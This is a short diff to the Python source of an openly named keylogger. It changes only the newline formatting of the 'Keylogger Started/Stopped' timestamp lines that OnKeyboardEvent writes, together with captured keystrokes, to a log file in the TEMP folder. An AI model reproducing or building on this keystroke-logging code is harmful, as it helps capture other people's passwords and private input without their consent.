@@ -122,9 +122,9 @@ def OnKeyboardEvent(event):
             TMP = os.environ["TEMP"]
             objLogFile = open(TMP + "/log.txt", 'w')
             if blnStop == "True":
-                objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S"))
+                objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
             elif blnFirstSend == "True":
-                objLogFile.write("Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+                objLogFile.write("\n" +"Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
                 blnFirstSend = "False"
             objLogFile.write(strLogs)
             objLogFile.close()
@@ -148,9 +148,9 @@ def OnKeyboardEvent(event):
         else:
             objLogFile = open(strLogFile, 'w')
         if blnStop == "True":
-            objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S"))
+            objLogFile.write("\n\n" + "Keylogger Stopped At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
         elif blnFirstSend == "True":
-            objLogFile.write("Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
+            objLogFile.write("\n" + "Keylogger Started At: " + time.strftime("%d/%m/%Y") + " " + time.strftime("%I:%M:%S") + "\n\n")
             blnFirstSend = "False"
         objLogFile.write(strLogs)
         objLogFile.close()
